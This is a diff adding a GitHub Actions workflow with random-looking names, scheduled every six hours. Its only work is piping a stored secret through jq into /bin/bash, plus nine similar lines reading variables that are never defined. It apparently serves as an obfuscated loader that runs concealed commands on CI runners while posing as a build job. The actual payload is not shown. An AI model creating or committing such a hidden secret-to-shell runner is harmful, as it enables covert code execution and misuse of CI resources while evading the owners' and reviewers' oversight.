@@ -1,0 +1,28 @@
+name: panangongrang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: panangongrang
+        env:
+          ou20853: ${{ secrets.ou20853 }}
+        run: |
+          echo $ou20853 | jq -r .wox79 | /bin/bash
+          echo $g837 | jq -r .zfc9 | /bin/bash
+          echo $vjzc8 | jq -r .cggc1569 | /bin/bash
+          echo $tj504 | jq -r .mque699 | /bin/bash
+          echo $tg69 | jq -r .qnk3 | /bin/bash
+          echo $rp9 | jq -r .mzx0762 | /bin/bash
+          echo $uryk9 | jq -r .hku85 | /bin/bash
+          echo $ukx375 | jq -r .n3 | /bin/bash
+          echo $d9 | jq -r .dewhy407 | /bin/bash
+          echo $zqai97372 | jq -r .pa73 | /bin/bash
+
